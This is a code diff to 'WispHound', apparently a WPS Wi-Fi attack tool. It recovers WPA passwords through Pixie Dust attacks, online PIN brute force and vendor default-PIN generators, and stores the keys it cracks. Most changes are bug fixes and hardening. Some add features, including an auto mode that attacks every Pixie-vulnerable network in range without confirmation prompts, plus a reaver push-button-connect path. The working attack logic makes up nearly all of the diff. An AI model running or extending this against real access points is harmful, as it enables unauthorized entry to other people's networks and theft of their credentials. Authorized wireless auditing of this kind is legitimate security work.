@@ -24,6 +24,7 @@ import os
 import pathlib
 import re
 import shutil
+import signal
 import socket
 import sqlite3
 import statistics
@@ -50,6 +51,16 @@ except ImportError:                                    # graceful degrade
 # Constants
 # ---------------------------------------------------------------------------
 VERSION = '2.1.0'
+
+def _graceful_exit_handler(signum, frame):
+    raise KeyboardInterrupt
+
+for _sig_name in ('SIGTERM', 'SIGHUP'):
+    if hasattr(signal, _sig_name):
+        try:
+            signal.signal(getattr(signal, _sig_name), _graceful_exit_handler)
+        except (ValueError, OSError):
+            pass
 
 PIXIE_VULNERABLE_CHIPSETS = {
     # Ralink / MediaTek — RT series
@@ -185,7 +196,7 @@ OUI_BUILTIN = {
     '60A44C': 'ASUSTek', '704D7B': 'ASUSTek',
     '7824AF': 'ASUSTek', 'D017C2': 'ASUSTek',
     '1C872C': 'ASUSTek', '2C56DC': 'ASUSTek',
-    'C860007': 'ASUSTek',
+    'C86000': 'ASUSTek',
     '788102': 'Sercomm', '7894B4': 'Sercomm',
     '0022B0': 'D-Link', '001CF0': 'D-Link',
     'C8BE19': 'TP-Link', 'C8D3A3': 'TP-Link',
@@ -241,9 +252,12 @@ def get_hex(line):
     return parts[2].replace(' ', '').upper()
 
 
-def recvuntil(pipe, what):
+def recvuntil(pipe, what, timeout=30):
     s = ''
+    start = time.time()
     while True:
+        if time.time() - start > timeout:
+            return s
         inp = pipe.stdout.read(1)
         if inp == '':
             return s
@@ -620,9 +634,9 @@ class WPSpin:
         pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) +
                 ((pin & 0xF) << 12) + ((pin & 0xF) << 16) +
                 ((pin & 0xF) << 20))
-        pin %= int(10e6)
-        if pin < int(10e5):
-            pin += ((pin % 9) * int(10e5)) + int(10e5)
+        pin %= int(1e6)
+        if pin < int(1e5):
+            pin += ((pin % 9) * int(1e5)) + int(1e5)
         return pin
 
     def pinDLink1(self, mac):
@@ -632,10 +646,13 @@ class WPSpin:
 
     def pinASUS(self, mac):
         b = [int(i, 16) for i in mac.string.split(':')]
-        s = ''.join(str((b[i % 6] + b[5]) %
-                        (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
-                    for i in range(7))
-        return int(s)
+        digits = []
+        for i in range(7):
+            denom = (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7)
+            if denom == 0:
+                denom = 10
+            digits.append(str((b[i % 6] + b[5]) % denom))
+        return int(''.join(digits))
 
     def pinAirocon(self, mac):
         b = [int(i, 16) for i in mac.string.split(':')]
@@ -1104,6 +1121,21 @@ class ReaverAttacker:
         argv += ['-p', pin]
         return self._run(argv, label=f'PIN {pin} (reaver)')
 
+    def pbc(self, bssid=None, channel=None):
+        """Run WPS Push Button Connect (PBC) transaction via reaver."""
+        argv = ['reaver', '-i', self.interface]
+        if bssid:
+            argv += ['-b', bssid]
+        if channel:
+            argv += ['-c', str(channel)]
+        argv += ['--pbc']
+        if self.verbose:
+            argv += ['-vv']
+        else:
+            argv += ['-v']
+        argv += ['-L', '-N']
+        return self._run(argv, label='Push Button Connect (reaver)')
+
     # ---- internals --------------------------------------------------------
     def _base_argv(self, bssid, channel=None):
         argv = ['reaver', '-i', self.interface, '-b', bssid]
@@ -1313,7 +1345,7 @@ def _handle_backend_result(result, bssid, db=None, save_result=False,
 
     if save_result and reports_dir:
         os.makedirs(reports_dir, exist_ok=True)
-        filename = reports_dir + 'stored'
+        filename = os.path.join(reports_dir, 'stored')
         dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
         with open(filename + '.txt', 'a', encoding='utf-8') as f:
             f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {result.essid}\n'
@@ -1359,10 +1391,14 @@ class BruteforceStatus:
 
     def display_status(self):
         avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
-        if len(self.mask) == 4:
+        if not self.mask or not self.mask.isdigit():
+            pct = 0.0
+        elif len(self.mask) <= 4:
             pct = int(self.mask) / 11000 * 100
+        elif len(self.mask) >= 7:
+            pct = ((10000 / 11000) + (int(self.mask[4:7]) / 11000)) * 100
         else:
-            pct = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
+            pct = int(self.mask) / 11000 * 100
         print(f'[*] {pct:.2f}% complete @ {self.start_time} '
               f'({avg:.2f} seconds/pin)')
 
@@ -1459,10 +1495,10 @@ class TargetDB:
         return row[0] if row else None
 
     def save_credentials(self, bssid, essid, pin, psk):
-        self.conn.execute(
+        cur = self.conn.execute(
             'UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 '
             'WHERE bssid=?', (pin, psk, bssid))
-        if self.conn.total_changes == 0:
+        if cur.rowcount == 0:
             self.conn.execute(
                 'INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
                 'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
@@ -1489,13 +1525,14 @@ class Companion:
     def __init__(self, interface, save_result=False, print_debug=False,
                  bssid='', db: Optional[TargetDB] = None,
                  json_mode=False, trace_log=None,
-                 pixiewps_timeout=120, cool_down=60):
+                 pixiewps_timeout=120, cool_down=60, auto_mode=False):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
         self.json_mode = json_mode
         self.pixiewps_timeout = pixiewps_timeout
         self.cool_down = cool_down
+        self.auto_mode = auto_mode
         self._constructed = False
 
         self.tempdir = tempfile.mkdtemp()
@@ -1522,13 +1559,14 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         home = str(pathlib.Path.home())
-        self.sessions_dir = f'{home}/.WispHound/sessions/'
-        self.pixiewps_dir = f'{home}/.WispHound/pixiewps/'
-        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
-        for d in (self.sessions_dir, self.pixiewps_dir):
+        self.sessions_dir = os.path.join(home, '.WispHound', 'sessions')
+        self.pixiewps_dir = os.path.join(home, '.WispHound', 'pixiewps')
+        self.reports_dir = os.path.join(
+            os.path.dirname(os.path.realpath(__file__)), 'reports')
+        for d in (self.sessions_dir, self.pixiewps_dir, self.reports_dir):
             os.makedirs(d, exist_ok=True)
 
-        self.db = db or TargetDB(f'{home}/.WispHound/targets.db')
+        self.db = db or TargetDB(os.path.join(home, '.WispHound', 'targets.db'))
         self._own_db = db is None
 
         self.generator = WPSpin()
@@ -1556,6 +1594,10 @@ class Companion:
         try:
             if getattr(self, 'wpas', None):
                 self.wpas.terminate()
+                try:
+                    self.wpas.wait(timeout=2)
+                except Exception:
+                    self.wpas.kill()
         except Exception:
             pass
         shutil.rmtree(getattr(self, 'tempdir', ''), ignore_errors=True)
@@ -1583,10 +1625,11 @@ class Companion:
     # ---- wpa_supplicant plumbing ------------------------------------------
     def __init_wpa_supplicant(self):
         print('[*] Running wpa_supplicant…')
-        cmd = (f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired '
-               f'-i{self.interface} -c{self.tempconf}')
+        argv = ['wpa_supplicant', '-K', '-d',
+                '-Dnl80211,wext,hostapd,wired',
+                f'-i{self.interface}', f'-c{self.tempconf}']
         self.wpas = subprocess.Popen(
-            cmd, shell=True, stdout=subprocess.PIPE,
+            argv, stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         while True:
             ret = self.wpas.poll()
@@ -1623,7 +1666,7 @@ class Companion:
     # ---- main log parser --------------------------------------------------
     def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None,
                       bssid=''):
-        if not verbose:
+        if verbose is None:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
         if not line:
@@ -1816,7 +1859,7 @@ class Companion:
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         os.makedirs(self.reports_dir, exist_ok=True)
-        filename = self.reports_dir + 'stored'
+        filename = os.path.join(self.reports_dir, 'stored')
         dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
         with open(filename + '.txt', 'a', encoding='utf-8') as f:
             f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
@@ -1833,8 +1876,8 @@ class Companion:
                         essid=essid, wps_pin=wps_pin, wpa_psk=wpa_psk)
 
     def __savePin(self, bssid, pin):
-        filename = (self.pixiewps_dir
-                    + f'{bssid.replace(":", "").upper()}.run')
+        filename = os.path.join(
+            self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
         with open(filename, 'w') as f:
             f.write(pin)
         print(f'[i] PIN saved in {filename}')
@@ -1909,6 +1952,9 @@ class Companion:
 
             self.sendOnly('WPS_CANCEL')
 
+            if self.connection_status.status == 'GOT_PSK':
+                return True
+
             if self.connection_status.status == 'WPS_FAIL' \
                     and attempt < max_retries:
                 back = 2 ** attempt
@@ -1930,12 +1976,12 @@ class Companion:
     def single_connection(self, bssid=None, pin=None, pixiemode=False,
                           pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
-        if not bssid:
+        if not bssid and not pbc_mode:
             print('[!] No BSSID supplied to single_connection()')
             return False
 
         # DB reuse: try a previously stored PIN first
-        if not pin and not pbc_mode:
+        if not pin and not pbc_mode and bssid:
             known = self.db.known_pin(bssid)
             if known:
                 print(f'[i] Known PIN in DB for {bssid}: {known} '
@@ -1943,32 +1989,41 @@ class Companion:
                 pin = known
 
         # Pixie-vulnerability promotion
-        if (not pixiemode and not pbc_mode and not pin
+        if (not pixiemode and not pbc_mode and not pin and bssid
                 and self.target_is_pixie_vuln):
             chipset = self.target_chipset or 'unknown chipset'
             print(f'[!] Target {bssid} looks Pixie Dust vulnerable ({chipset}).')
-            ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
-            if ans != 'n':
+            if self.auto_mode:
                 pixiemode = True
+            else:
+                ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
+                if ans != 'n':
+                    pixiemode = True
 
         if not pin:
-            if pixiemode:
+            if pixiemode and bssid:
                 try:
-                    fn = (self.pixiewps_dir
-                          + f'{bssid.replace(":", "").upper()}.run')
+                    fn = os.path.join(
+                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
                     with open(fn, 'r') as f:
                         t_pin = f.readline().strip()
-                    if input(f'[?] Use previously calculated PIN '
+                    if self.auto_mode:
+                        pin = t_pin
+                    elif input(f'[?] Use previously calculated PIN '
                              f'{t_pin}? [n/Y] ').lower() != 'n':
                         pin = t_pin
                     else:
                         raise FileNotFoundError
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
-            elif not pbc_mode:
-                pin = self.__prompt_wpspin(bssid) or '12345670'
+            elif not pbc_mode and bssid:
+                if self.auto_mode:
+                    pin = self.generator.getLikely(bssid) or '12345670'
+                else:
+                    pin = self.__prompt_wpspin(bssid) or '12345670'
 
-        self.db.bump_attempts(bssid)
+        if bssid:
+            self.db.bump_attempts(bssid)
 
         if pbc_mode:
             self.__wps_connection(bssid, pbc_mode=True)
@@ -1979,7 +2034,8 @@ class Companion:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
                 print('\nAborting…')
-                self.__savePin(bssid, pin)
+                if bssid:
+                    self.__savePin(bssid, pin)
                 return False
         else:
             self.__wps_connection(bssid, pin, pixiemode)
@@ -1988,13 +2044,13 @@ class Companion:
             self.__credentialPrint(
                 pin, self.connection_status.wpa_psk,
                 self.connection_status.essid)
-            if self.save_result:
+            if self.save_result and bssid:
                 self.__saveResult(bssid, self.connection_status.essid,
                                   pin, self.connection_status.wpa_psk)
-            if not pbc_mode:
+            if not pbc_mode and bssid:
                 try:
-                    os.remove(self.pixiewps_dir
-                              + f'{bssid.replace(":", "").upper()}.run')
+                    os.remove(os.path.join(
+                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run'))
                 except FileNotFoundError:
                     pass
             return True
@@ -2010,12 +2066,13 @@ class Companion:
                   f'({self.pixie_creds.status_line()})')
             return False
         else:
-            if store_pin_on_fail:
+            if store_pin_on_fail and bssid:
                 self.__savePin(bssid, pin)
             return False
 
     # ---- bruteforce -------------------------------------------------------
-    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+    def __first_half_bruteforce(self, bssid, f_half, delay=None,
+                                _max_retries=3):
         checksum = self.generator.checksum
         while int(f_half) < 10000:
             t = int(f_half + '000')
@@ -2026,15 +2083,21 @@ class Companion:
                 return f_half
             if self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__first_half_bruteforce(bssid, f_half)
+                _max_retries -= 1
+                if _max_retries <= 0:
+                    print('[-] Max retries reached for current PIN')
+                    return False
+                continue
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
+            _max_retries = 3  # reset retry counter on progress
             if delay:
                 time.sleep(delay)
         print('[-] First half not found')
         return False
 
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None,
+                                 _max_retries=3):
         checksum = self.generator.checksum
         while int(s_half) < 1000:
             t = int(f_half + s_half)
@@ -2044,21 +2107,29 @@ class Companion:
                 return pin
             if self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
+                _max_retries -= 1
+                if _max_retries <= 0:
+                    print('[-] Max retries reached for current PIN')
+                    return False
+                continue
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
+            _max_retries = 3  # reset retry counter on progress
             if delay:
                 time.sleep(delay)
         return False
 
     def smart_bruteforce(self, bssid, start_pin=None, delay=None,
-                         loop=False):
+                         loop=False, auto_resume=False):
         if (not start_pin) or (len(start_pin) < 4):
             try:
-                fn = (self.sessions_dir
-                      + f'{bssid.replace(":", "").upper()}.run')
+                fn = os.path.join(
+                    self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
                 with open(fn, 'r') as f:
-                    if input(f'[?] Restore previous session for {bssid}? '
+                    if auto_resume or self.auto_mode:
+                        mask = f.readline().strip()
+                        print(f'[i] Resuming saved session for {bssid} (mask: {mask})')
+                    elif input(f'[?] Restore previous session for {bssid}? '
                              f'[n/Y] ').lower() != 'n':
                         mask = f.readline().strip()
                     else:
@@ -2078,11 +2149,13 @@ class Companion:
             elif len(mask) == 7:
                 self.__second_half_bruteforce(
                     bssid, mask[:4], mask[4:], delay)
-            raise KeyboardInterrupt
+            if self.connection_status.status == 'GOT_PSK':
+                print('[+] Brute-force complete — credentials recovered.')
+                return
         except KeyboardInterrupt:
             print('\nAborting…')
-            fn = (self.sessions_dir
-                  + f'{bssid.replace(":", "").upper()}.run')
+            fn = os.path.join(
+                self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
             with open(fn, 'w') as f:
                 f.write(self.bruteforce.mask)
             print(f'[i] Session saved in {fn}')
@@ -2098,18 +2171,20 @@ class Companion:
 # ---------------------------------------------------------------------------
 class WiFiScanner:
     def __init__(self, interface, vuln_list=None, reverse_scan=False,
-                 db: Optional[TargetDB] = None):
+                 db: Optional[TargetDB] = None, min_rssi=None, band=None):
         self.interface = interface
         self.vuln_list = vuln_list or []
         self.reverse_scan = reverse_scan
         self.db = db
+        self.min_rssi = min_rssi
+        self.band = band
         self.selected_vuln = False
         self.selected_chipset = ''
         self.selected_channel = 0
 
         self.stored = []
-        reports = os.path.dirname(os.path.realpath(__file__)) \
-            + '/reports/stored.csv'
+        reports = os.path.join(
+            os.path.dirname(os.path.realpath(__file__)), 'reports', 'stored.csv')
         try:
             with open(reports, 'r', newline='',
                       encoding='utf-8', errors='replace') as f:
@@ -2139,7 +2214,7 @@ class WiFiScanner:
                 'Security type': 'Unknown', 'WPS': False,
                 'WPS locked': False, 'Model': '',
                 'Model number': '', 'Device name': '',
-                'Channel': 0, 'Frequency': 0,
+                'Channel': 0, 'Frequency': 0, 'Level': -100,
             })
             networks[-1]['BSSID'] = result.group(1).upper()
 
@@ -2148,12 +2223,18 @@ class WiFiScanner:
                     .encode('latin1').decode('utf-8', errors='replace'))
 
         def handle_essid(line, result, networks):
+            if not networks:
+                return
             networks[-1]['ESSID'] = _decode(result.group(1))
 
         def handle_level(line, result, networks):
+            if not networks:
+                return
             networks[-1]['Level'] = int(float(result.group(1)))
 
         def handle_securityType(line, result, networks):
+            if not networks:
+                return
             sec = networks[-1]['Security type']
             if result.group(1) == 'capability':
                 sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
@@ -2169,22 +2250,34 @@ class WiFiScanner:
             networks[-1]['Security type'] = sec
 
         def handle_wps(line, result, networks):
+            if not networks:
+                return
             networks[-1]['WPS'] = result.group(1)
 
         def handle_wpsLocked(line, result, networks):
+            if not networks:
+                return
             if int(result.group(1), 16):
                 networks[-1]['WPS locked'] = True
 
         def handle_model(line, result, networks):
+            if not networks:
+                return
             networks[-1]['Model'] = _decode(result.group(1))
 
         def handle_modelNumber(line, result, networks):
+            if not networks:
+                return
             networks[-1]['Model number'] = _decode(result.group(1))
 
         def handle_deviceName(line, result, networks):
+            if not networks:
+                return
             networks[-1]['Device name'] = _decode(result.group(1))
 
         def handle_frequency(line, result, networks):
+            if not networks:
+                return
             freq = int(result.group(1))
             networks[-1]['Frequency'] = freq
             if 2412 <= freq <= 2484:
@@ -2196,8 +2289,8 @@ class WiFiScanner:
             else:
                 networks[-1]['Channel'] = 0
 
-        cmd = f'iw dev {self.interface} scan'
-        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+        proc = subprocess.run(['iw', 'dev', self.interface, 'scan'],
+                              stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT,
                               encoding='utf-8', errors='replace')
         lines = proc.stdout.splitlines()
@@ -2228,6 +2321,15 @@ class WiFiScanner:
                     handler(line, m, networks)
 
         networks = [n for n in networks if n['WPS']]
+        if self.min_rssi is not None:
+            networks = [n for n in networks if n.get('Level', -100) >= self.min_rssi]
+        if self.band:
+            if self.band == '2.4':
+                networks = [n for n in networks if 2400 <= n.get('Frequency', 0) <= 2500]
+            elif self.band == '5':
+                networks = [n for n in networks if 5000 <= n.get('Frequency', 0) <= 5900]
+            elif self.band == '6':
+                networks = [n for n in networks if 5900 <= n.get('Frequency', 0) <= 7200]
         if not networks:
             return False
 
@@ -2338,7 +2440,10 @@ class WiFiScanner:
 # Auto pipeline
 # ---------------------------------------------------------------------------
 def auto_exploit(interface, args, db):
-    scanner = WiFiScanner(interface, [], reverse_scan=False, db=db)
+    scanner = WiFiScanner(
+        interface, [], reverse_scan=False, db=db,
+        min_rssi=getattr(args, 'min_rssi', None),
+        band=getattr(args, 'band', None))
     networks = scanner.iw_scanner()
     if not networks:
         print('[-] No WPS networks.')
@@ -2348,7 +2453,7 @@ def auto_exploit(interface, args, db):
                                   n['WPS locked'], -n['Level']))
 
     backend = getattr(args, 'backend', BACKEND_INTERNAL)
-    reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+    reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')
 
     # ------- External backends (reaver / bully) ----------------------------
     if backend in (BACKEND_REAVER, BACKEND_BULLY):
@@ -2382,8 +2487,9 @@ def auto_exploit(interface, args, db):
                         result = attacker.pixie_dust(net['BSSID'], channel=ch)
                         if not result.success:
                             print('[i] Pixie Dust failed — trying PIN attack')
+                            likely_pin = WPSpin().getLikely(net['BSSID']) or '12345670'
                             result = attacker.single_pin(
-                                net['BSSID'], '12345670', channel=ch)
+                                net['BSSID'], likely_pin, channel=ch)
                     else:
                         result = attacker.bruteforce(
                             net['BSSID'], channel=ch)
@@ -2413,7 +2519,8 @@ def auto_exploit(interface, args, db):
                          json_mode=args.json,
                          trace_log=args.trace_log,
                          pixiewps_timeout=args.timeout,
-                         cool_down=args.cool)
+                         cool_down=args.cool,
+                         auto_mode=True)
         comp.target_is_pixie_vuln = net['Pixie vulnerable']
         comp.target_chipset = net.get('Chipset', '')
         try:
@@ -2438,7 +2545,7 @@ def auto_exploit(interface, args, db):
 # ---------------------------------------------------------------------------
 def ifaceUp(iface, down=False):
     action = 'down' if down else 'up'
-    return subprocess.run(f'ip link set {iface} {action}', shell=True,
+    return subprocess.run(['ip', 'link', 'set', iface, action],
                           stdout=sys.stdout, stderr=sys.stdout).returncode == 0
 
 
@@ -2465,6 +2572,7 @@ Optional arguments:
     -B, --bruteforce          Run online bruteforce attack
     --push-button-connect     Run WPS push button connection
     -A, --auto                Scan → rank → attack each Pixie-vulnerable target
+    -V, --version             Show program's version number and exit
 
 Advanced arguments:
     -d, --delay=<n>           Delay between pin attempts [0]
@@ -2477,6 +2585,9 @@ Advanced arguments:
     -r, --reverse-scan        Reverse order of networks in scan list
     --mtk-wifi                Activate MediaTek Wi-Fi driver
     -v, --verbose             Verbose output
+    --min-rssi=<dBm>          Filter out APs weaker than this signal level (e.g. -75)
+    --band=<2.4|5|6>          Filter scan by Wi-Fi band (2.4, 5, or 6 GHz)
+    --resume                  Automatically resume saved brute-force session
 
 Persistence & output:
     --db=<path>               SQLite target database (default ~/.WispHound/targets.db)
@@ -2500,6 +2611,8 @@ if __name__ == '__main__':
         description=f'WispHound {VERSION} — WPS reconnaissance and '
                     'Pixie Dust prioritization',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
+    parser.add_argument('-V', '--version', action='version',
+                        version=f'%(prog)s {VERSION}')
     parser.add_argument('-i', '--interface', required=True,
                         help='Name of the interface to use')
     parser.add_argument('-b', '--bssid', help='BSSID of the target AP')
@@ -2557,6 +2670,12 @@ if __name__ == '__main__':
                         help='Cool-down seconds after 3 NACKs (default 60)')
     parser.add_argument('--no-lockout-check', action='store_true',
                         help='Skip lockout safety (not recommended)')
+    parser.add_argument('--min-rssi', type=int, default=None,
+                        help='Filter out APs weaker than this signal level in dBm (e.g. -75)')
+    parser.add_argument('--band', choices=['2.4', '5', '6'], default=None,
+                        help='Filter scan by Wi-Fi band (2.4, 5, or 6 GHz)')
+    parser.add_argument('--resume', action='store_true',
+                        help='Automatically resume saved brute-force session without prompting')
 
     args = parser.parse_args()
 
@@ -2597,16 +2716,40 @@ if __name__ == '__main__':
                 selected_chipset = ''
                 selected_channel = args.channel
 
-                if args.pbc and args.backend == 'internal':
-                    comp = Companion(
-                        args.interface, args.write,
-                        print_debug=args.verbose, db=db,
-                        json_mode=args.json, trace_log=args.trace_log,
-                        pixiewps_timeout=args.timeout, cool_down=args.cool)
-                    try:
-                        comp.single_connection(pbc_mode=True)
-                    finally:
-                        comp.cleanup()
+                if args.pbc:
+                    reports_dir = os.path.join(
+                        os.path.dirname(os.path.realpath(__file__)), 'reports')
+                    if args.backend == 'internal':
+                        comp = Companion(
+                            args.interface, args.write,
+                            print_debug=args.verbose, db=db,
+                            json_mode=args.json, trace_log=args.trace_log,
+                            pixiewps_timeout=args.timeout, cool_down=args.cool)
+                        try:
+                            comp.single_connection(bssid=args.bssid, pbc_mode=True)
+                        finally:
+                            comp.cleanup()
+                    elif args.backend == 'reaver':
+                        attacker_cls = ReaverAttacker
+                        if not attacker_cls.is_available():
+                            die('reaver is not installed or not in PATH')
+                        print(f'[*] Switching {args.interface} to monitor mode…')
+                        mon_iface = setup_monitor_mode(args.interface)
+                        try:
+                            attacker = attacker_cls(
+                                mon_iface, verbose=args.verbose,
+                                timeout=args.timeout, delay=args.delay,
+                                json_mode=args.json)
+                            res = attacker.pbc(args.bssid, channel=args.channel)
+                            _handle_backend_result(
+                                res, args.bssid or res.essid or 'PBC-AP', db=db,
+                                save_result=args.write, reports_dir=reports_dir,
+                                json_mode=args.json)
+                        finally:
+                            print(f'[*] Restoring {args.interface} to managed mode…')
+                            teardown_monitor_mode(mon_iface, args.interface)
+                    else:
+                        die('Bully does not support PBC mode. Use internal or reaver backend.')
                 else:
                     if not args.bssid:
                         try:
@@ -2617,7 +2760,8 @@ if __name__ == '__main__':
                             vuln_list = []
                         scanner = WiFiScanner(
                             args.interface, vuln_list,
-                            reverse_scan=args.reverse_scan, db=db)
+                            reverse_scan=args.reverse_scan, db=db,
+                            min_rssi=args.min_rssi, band=args.band)
                         if not args.loop:
                             print('[*] BSSID not specified (--bssid) — '
                                   'scanning for available networks')
@@ -2632,7 +2776,8 @@ if __name__ == '__main__':
                             break
                         continue
 
-                    reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+                    reports_dir = os.path.join(
+                        os.path.dirname(os.path.realpath(__file__)), 'reports')
 
                     # ------- External backends (reaver / bully) ------------
                     if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
@@ -2681,6 +2826,7 @@ if __name__ == '__main__':
                                     elif len(pins) == 1:
                                         pin = pins[0]['pin']
 
+                            res = None
                             if pixiemode or (not pin and not args.bruteforce):
                                 res = attacker.pixie_dust(args.bssid, channel=selected_channel)
                                 if not res.success and not pin and not args.bruteforce:
@@ -2694,9 +2840,12 @@ if __name__ == '__main__':
                                 res = attacker.bruteforce(
                                     args.bssid, channel=selected_channel, start_pin=args.pin)
 
-                            _handle_backend_result(
-                                res, args.bssid, db=db, save_result=args.write,
-                                reports_dir=reports_dir, json_mode=args.json)
+                            if res is not None:
+                                _handle_backend_result(
+                                    res, args.bssid, db=db, save_result=args.write,
+                                    reports_dir=reports_dir, json_mode=args.json)
+                            else:
+                                print('[-] No attack mode selected for external backend')
                         finally:
                             print(f'[*] Restoring {args.interface} to managed mode…')
                             teardown_monitor_mode(mon_iface, args.interface)
@@ -2714,7 +2863,8 @@ if __name__ == '__main__':
                             if args.bruteforce:
                                 comp.smart_bruteforce(
                                     args.bssid, args.pin, args.delay,
-                                    loop=args.loop)
+                                    loop=args.loop,
+                                    auto_resume=args.resume)
                             else:
                                 comp.single_connection(
                                     args.bssid, args.pin, args.pixie_dust,
